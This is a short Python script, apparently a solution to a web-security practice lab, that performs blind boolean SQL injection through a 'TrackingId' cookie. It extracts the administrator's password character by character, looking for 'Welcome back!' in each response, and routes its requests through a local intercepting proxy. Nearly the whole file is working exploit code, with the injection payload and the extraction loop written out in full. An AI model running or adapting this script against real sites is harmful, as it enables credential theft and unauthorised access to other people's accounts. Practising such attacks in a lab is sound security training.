import sys
import requests
import string
import time
import urllib3 
# I want to perform cluster comb attack to 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http" : 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url): 
    password_extracted = ""
    for i in range(1,21): 
        # special chars should be included too
        for j in range(32, 127):
            c = chr(j) 
            payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i},1)='{c}'-- "
            cookies = {'TrackingId': f"LCmPwM5sbGgGTWHz{payload}", 'session': 'nVv9ss2PgSytL7GtOi6D48ErNIcpQeAY'}
            response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome back!" in response.text: 
                password_extracted += c
                print(f"Found character at position {i}: {c}")
                break

def main (): 
    if len(sys.argv) != 2:
        print ("Usage: python3 solver_script.py <url>")
        print ("Example: python3 solver_script.py 'https://example.com/vulnerable_page.php?id=1'")
        sys.exit(0)
    url = sys.argv[1]
    print('retrieving password for user administrator...')
    sqli_password(url)

if __name__ == "__main__":
    main ()